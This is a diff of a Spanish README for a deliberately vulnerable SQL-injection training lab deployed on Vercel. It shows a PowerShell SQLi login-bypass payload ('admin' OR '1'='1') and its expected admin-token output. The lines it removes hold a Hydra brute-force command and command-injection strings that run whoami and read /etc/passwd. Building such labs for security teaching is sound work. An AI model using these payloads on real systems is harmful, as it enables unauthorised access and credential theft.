@@ -1,87 +1,77 @@
-# Nexus Cloud Solutions 🌐
+# Nexus Cloud Solutions 🌐 — Laboratorio de Inyección SQL (SQLi)
 
-Plataforma web con aspecto y comportamiento 100% corporativo diseñada para pruebas de penetración y demostraciones de ciberseguridad ejecutadas **directamente desde tu propia terminal** (`curl`, `hydra`, `sqlmap`, scripts de Python, etc.).
+Plataforma web con aspecto y comportamiento 100% corporativo diseñada para la demostración, auditoría y explotación de **Inyección SQL (SQLi)** en mecanismos de autenticación, ejecutada **directamente desde PowerShell** (`Invoke-RestMethod`, scripts `.ps1`, etc.) sin necesidad de Bash ni herramientas adicionales.
 
 Totalmente optimizada para desplegarse en **Vercel** usando Serverless Functions en Node.js.
 
 ---
 
-## 🎯 Endpoints y Pruebas desde tu Terminal
+## ⚡ Auditoría Automatizada desde PowerShell (`test-lab.ps1`)
 
-### 1. 💉 Inyección SQL (SQLi)
-* **Endpoint:** `POST /api/login`
-* **Prueba con `curl`:**
-```bash
-# Bypass de autenticación mediante SQL Injection
-curl -X POST https://TU-DOMINIO.vercel.app/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "cualquiercosa"}'
-```
-* **Respuesta esperada:**
-```json
-{
-  "success": true,
-  "message": "Inicio de sesión correcto (Acceso Administrativo)",
-  "user": {
-    "id": 1,
-    "username": "admin",
-    "role": "SuperAdministrator",
-    "token": "nexus_admin_sess_9941a8e2",
-    "internal_flag": "FLAG-SQLI{nexus_sql_injection_bypass_success}"
-  }
-}
+El proyecto incluye un script de auditoría automatizado para evaluar la vulnerabilidad SQLi con un solo comando:
+
+```powershell
+# Ejecutar la prueba contra tu despliegue en Vercel
+.\test-lab.ps1 -BaseUrl "https://TU-DOMINIO.vercel.app"
+
+# Si estás ejecutando en local (localhost:3000):
+.\test-lab.ps1
 ```
 
 ---
 
-### 2. ⚡ Fuerza Bruta de Credenciales
-* **Endpoint:** `POST /api/login`
-* **Usuario válido en el sistema:** `admin` (Contraseña correcta: `dragon2024`)
-* **Prueba de intento fallido:**
-```bash
-curl -X POST https://TU-DOMINIO.vercel.app/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin", "password": "password123"}'
-```
-* **Respuesta de fallo (HTTP 401 Unauthorized):**
-```json
-{
-  "success": false,
-  "error": "Credenciales inválidas"
-}
+## 🎯 Demostración y Prueba Manual de SQLi desde PowerShell
+
+### Endpoint Vulnerable
+* **URL:** `POST /api/login`
+* **Tipo:** Inyección SQL basada en bypass de autenticación (Tautología en cláusula WHERE).
+
+### Ejecución en PowerShell (`Invoke-RestMethod`):
+
+```powershell
+# Payload de evasión de autenticación
+$body = @{
+    username = "admin' OR '1'='1"
+    password = "cualquiercosa"
+} | ConvertTo-Json
+
+$response = Invoke-RestMethod -Uri "https://TU-DOMINIO.vercel.app/api/login" -Method Post -ContentType "application/json" -Body $body
+
+# Mostrar el resultado obtenido
+$response | Format-List
+$response.user | Format-List
 ```
 
-* **Prueba con Hydra (Diccionario):**
-```bash
-hydra -l admin -P diccionario.txt TU-DOMINIO.vercel.app https-post-form "/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:Credenciales inválidas"
-```
-
----
-
-### 3. 🖥️ Inyección de Comandos del Sistema (Command Injection)
-* **Endpoint:** `GET /api/ping?host={host}` o `POST /api/ping`
-* **Ping legítimo con `curl`:**
-```bash
-curl "https://TU-DOMINIO.vercel.app/api/ping?host=8.8.8.8"
-```
-* **Inyección de comandos arbitrarios:**
-```bash
-# Ejecutar 'whoami'
-curl "https://TU-DOMINIO.vercel.app/api/ping?host=8.8.8.8;whoami"
-
-# Leer archivo /etc/passwd simulado
-curl "https://TU-DOMINIO.vercel.app/api/ping?host=127.0.0.1%26%26cat%20/etc/passwd"
+### Respuesta esperada en PowerShell:
+```powershell
+success       : True
+message       : Inicio de sesión correcto (Acceso Administrativo)
+user          : @{id=1; username=admin; role=SuperAdministrator; token=nexus_admin_sess_9941a8e2; internal_flag=FLAG-SQLI{nexus_sql_injection_bypass_success}}
+debug_query   : SELECT * FROM accounts WHERE username = 'admin' OR '1'='1' AND password_hash = 'cualquiercosa' LIMIT 1;
 ```
 
 ---
 
-## 🚀 Despliegue en Vercel
+## 💻 Prueba en la Interfaz Web Gráfica
 
-1. Haz push a tu repositorio de GitHub:
-   ```bash
+1. Entra a tu sitio web (`https://TU-DOMINIO.vercel.app`).
+2. Ve a la sección **Acceso a Clientes**.
+3. En el formulario de inicio de sesión ingresa:
+   * **Usuario:** `admin' OR '1'='1`
+   * **Contraseña:** *(Cualquier valor)*
+4. Pulsa **Ingresar al Panel**.
+5. Se abrirá la consola de administración con las estadísticas corporativas y la bandera:
+   `FLAG-SQLI{nexus_sql_injection_bypass_success}`.
+
+---
+
+## 🚀 Despliegue en Vercel desde PowerShell
+
+1. Confirma los cambios y súbelos a tu repositorio de GitHub:
+   ```powershell
    git add .
-   git commit -m "Deploy NexusCloud"
+   git commit -m "Laboratorio centrado exclusivamente en SQLi"
    git push origin main
    ```
 2. Entra en [vercel.com/new](https://vercel.com/new) e importa tu repositorio `lopezjesus-cyber/vul_web`.
-3. Vercel desplegará tanto el frontend estático como las funciones serverless (`/api/login` y `/api/ping`) con HTTPS automático.
+3. Vercel desplegará automáticamente la aplicación frontend y la función serverless `/api/login` con HTTPS habilitado.
